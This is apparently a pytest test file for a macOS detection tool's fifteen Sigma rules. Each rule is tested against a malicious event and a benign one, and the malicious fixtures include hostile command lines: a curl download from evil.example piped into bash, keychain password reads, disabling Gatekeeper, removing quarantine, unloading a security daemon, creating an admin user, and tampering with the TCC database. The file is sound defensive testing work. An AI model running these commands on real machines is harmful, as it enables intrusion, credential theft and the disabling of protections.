"""Every rule loads in both engines, and fires on its true positive but not its benign twin."""

from __future__ import annotations

from pathlib import Path

import pytest
from conftest import exec_cols, norm, oq
from sigma.collection import SigmaCollection

from bastion.config import bundled_rules_dir
from bastion.detect.sigma import load_rules

RULES_DIR = bundled_rules_dir()
RULES, ERRORS = load_rules(RULES_DIR)
BY_TITLE = {r.title: r for r in RULES}


def test_all_rules_load_in_bastion_engine():
    assert ERRORS == []
    assert len(RULES) == 15
    assert len({r.id for r in RULES}) == 15


@pytest.mark.parametrize("path", sorted(RULES_DIR.rglob("*.yml")), ids=lambda p: p.name)
def test_rule_is_valid_sigma(path: Path):
    coll = SigmaCollection.from_yaml(path.read_text(), collect_errors=True)
    assert not coll.errors
    for rule in coll.rules:
        assert not rule.errors, rule.errors
        for cond in rule.detection.parsed_condition:
            cond.parse()  # raises on invalid condition syntax
        assert rule.level is not None
        assert any(str(t).startswith("attack.t") for t in rule.tags)


def fires(title: str, event: dict) -> bool:
    return BY_TITLE[title].matches(event)


def ex(path, cmd="", **kw):
    return norm(oq("process_events", exec_cols(path, cmd, **kw)))


def fe(target, activity="create", proc="/usr/bin/python3"):
    return norm(oq("file_events", {"pid": "77", "path": proc, "filename": target,
                                   "dest_filename": "", "event_type": activity,
                                   "time": "1793480000"}))


def fs(target, action="CREATED"):
    return norm(oq("fs_events", {"target_path": target, "action": action}))


CASES = [
    ("Unsigned or Ad-hoc Signed Binary Run From a Download Folder",
     ex("/Users/colin/Soulseek Downloads/Setup", flags="ADHOC"),
     ex("/Users/colin/Downloads/Signed.app/Contents/MacOS/Signed", team_id="ABCDE12345")),
    ("Execution From a Temporary or Shared Folder",
     ex("/private/tmp/.x/payload"),
     ex("/private/tmp/brew-build/cc", parent_path="/opt/homebrew/Library/Homebrew/brew.sh")),
    ("Binary Executed From a Hidden Folder in the Home Directory",
     ex("/Users/colin/.conVonNuv/agent"),
     ex("/Users/colin/.cargo/bin/cargo")),
    ("Download Piped Into a Shell",
     ex("/bin/sh", "sh -c curl -fsSL https://evil.example/x.sh | bash"),
     ex("/usr/bin/curl", "curl -fsSL https://example.com -o file.txt")),
    ("AppleScript Dialog Asking for a Password",
     ex("/usr/bin/osascript", 'osascript -e display dialog "Update" with hidden answer'),
     ex("/usr/bin/osascript", 'osascript -e display notification "Build done"')),
    ("Keychain Secrets Read With the security CLI",
     ex("/usr/bin/security", "security find-generic-password -wa Chrome", platform=1),
     ex("/usr/bin/security", "security list-keychains", platform=1)),
    ("Gatekeeper Disabled With spctl",
     ex("/usr/sbin/spctl", "spctl --master-disable", platform=1),
     ex("/usr/sbin/spctl", "spctl --status", platform=1)),
    ("Quarantine Attribute Removed From a File",
     ex("/usr/bin/xattr", "xattr -dr com.apple.quarantine /Applications/Crack.app", platform=1),
     ex("/usr/bin/xattr", "xattr -l /Applications/Safari.app", platform=1)),
    ("Attempt to Stop or Unload a Security Tool",
     ex("/bin/launchctl", "launchctl bootout system/com.northpolesec.santa.daemon", platform=1),
     ex("/bin/launchctl", "launchctl list", platform=1)),
    ("Local Account Created or Added to the Admin Group",
     ex("/usr/sbin/dseditgroup", "dseditgroup -o edit -a hacker -t user admin", platform=1),
     ex("/usr/sbin/dseditgroup", "dseditgroup -o read staff", platform=1)),
    ("Privacy Permission (TCC) Database Tampering",
     ex("/usr/bin/sqlite3",
        "sqlite3 /Library/Application Support/com.apple.TCC/TCC.db INSERT ...", platform=1),
     ex("/usr/bin/sqlite3", "sqlite3 notes.db .tables", platform=1)),
    ("LaunchAgent or LaunchDaemon Property List Written",
     fs("/Users/colin/Library/LaunchAgents/com.update.helper.plist"),
     fs("/Users/colin/Library/LaunchAgents/com.apple.something.plist")),
    ("Shell Startup File Modified",
     fs("/Users/colin/.zshrc", "UPDATED"),
     fs("/Users/colin/.zsh_history", "UPDATED")),
    ("Credential Store Opened by an Unexpected Process",
     fe("/Users/colin/.ssh/id_ed25519", "open", proc="/Users/colin/Downloads/thing"),
     fe("/Users/colin/.ssh/id_ed25519", "open", proc="/usr/bin/ssh")),
    ("New LaunchAgent, LaunchDaemon or Login Item",
     norm(oq("launchd", {"path": "/Users/colin/Library/LaunchAgents/com.update.helper.plist",
                         "name": "com.update.helper.plist", "label": "com.update.helper",
                         "program": "/Users/colin/.x/agent"})),
     norm(oq("launchd", {"path": "/Library/LaunchAgents/com.apple.foo.plist",
                         "name": "com.apple.foo.plist", "label": "com.apple.foo",
                         "program": "/usr/libexec/foo"}))),
]


def test_every_rule_has_a_case():
    assert {c[0] for c in CASES} == set(BY_TITLE)


@pytest.mark.parametrize("title,positive,negative", CASES, ids=[c[0][:40] for c in CASES])
def test_rule_positive_and_negative(title, positive, negative):
    assert fires(title, positive), "true positive did not fire"
    assert not fires(title, negative), "benign twin fired"


def test_unsigned_rule_also_fires_on_santa_event():
    line = ("[2026-10-31T20:00:00.000Z] I santad: action=EXEC|decision=ALLOW|reason=UNKNOWN|"
            "sha256=abc|teamid=|signingid=|pid=9|ppid=1|uid=501|user=colin|mode=M|"
            "path=/Users/colin/MEGA downloads/tool|args=tool --run")
    ev = norm(line, "santa")
    assert fires("Unsigned or Ad-hoc Signed Binary Run From a Download Folder", ev)


def test_no_cross_category_matches():
    # a file event must never satisfy a process_creation rule, and vice versa
    file_ev = fs("/Users/colin/Downloads/x")
    assert not fires("Unsigned or Ad-hoc Signed Binary Run From a Download Folder", file_ev)
    assert not fires("Shell Startup File Modified", ex("/Users/colin/.zshrc"))
